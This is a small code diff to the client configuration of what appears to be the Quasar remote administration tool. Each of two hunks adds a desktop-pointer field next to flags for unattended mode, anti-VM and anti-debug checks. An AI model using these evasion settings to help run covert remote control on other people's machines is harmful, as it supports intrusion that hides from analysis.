@@ -39,6 +39,7 @@ namespace Quasar.Client.Config
         public static bool UNATTENDEDMODE = true;
         public static bool ANTIVM = false;
         public static bool ANTIDEBUG = false;
+        public static IntPtr OriginalDesktopPointer = IntPtr.Zero;
 
         public static bool Initialize()
         {
@@ -72,6 +73,7 @@ namespace Quasar.Client.Config
         public static bool UNATTENDEDMODE = true;
         public static bool ANTIVM = false;
         public static bool ANTIDEBUG = false;
+        public static IntPtr OriginalDesktopPointer = IntPtr.Zero;
 
         public static bool Initialize()
         {
